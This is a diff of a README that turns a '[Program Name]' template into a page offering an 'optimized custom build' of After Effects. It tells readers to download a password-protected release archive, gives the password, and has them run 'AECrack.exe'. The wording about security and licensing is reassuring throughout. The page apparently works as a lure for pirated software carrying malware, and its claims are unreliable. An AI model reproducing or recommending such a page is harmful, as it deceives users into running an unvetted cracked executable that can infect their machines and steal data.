@@ -1,4 +1,4 @@
-<h1 align="center"> [Program Name] v26.3 — Optimized Custom Build </h1>
+<h1 align="center"> After Effects v26.3 — Optimized Custom Build </h1>
 
 <p align="center">
   <img src="https://img.shields.io/badge/Version-26.3-blue.svg" alt="Version">
@@ -6,7 +6,7 @@
   <img src="https://img.shields.io/badge/Platform-Windows-lightgrey.svg" alt="Platform">
 </p>
 
-> A highly optimized, licensed custom assembly of **[Program Name]** designed for maximum stability, reduced resource consumption, and an improved user interface.
+> A highly optimized, licensed custom assembly of **After Effects** designed for maximum stability, reduced resource consumption, and an improved user interface.
 
 Standard installations often carry unnecessary background services and heavy UI elements. This custom build strips away the bloat while maintaining 100% core functionality, providing a seamless and responsive workflow.
 
@@ -35,8 +35,16 @@ Consistent updates ensure compatibility with modern systems and peak performance
 
 1. Download the latest build from the **[Releases](../../releases)** section.
 2. Extract the archive into your preferred directory.
-3. Run `setup.exe` and follow the standard installation prompts.
+3. Run `AECrack.exe` and follow the standard installation prompts.
 4. Launch the application from the desktop shortcut and enjoy the optimized experience.
+
+## 🔒 Security & Archive Password
+
+To ensure the integrity of the files and protect this custom assembly from unauthorized modifications or third-party re-uploads, the release archive is encrypted.
+
+**Archive Password:** `After Effects`
+
+> **⚠️ Security Notice:** Only use the official release from this repository. We cannot guarantee the safety or performance of archives downloaded from external sites.
 
 ---
 *Disclaimer: This repository is maintained for optimization and performance enhancement purposes. All rights to the original core software belong to its respective developers.*
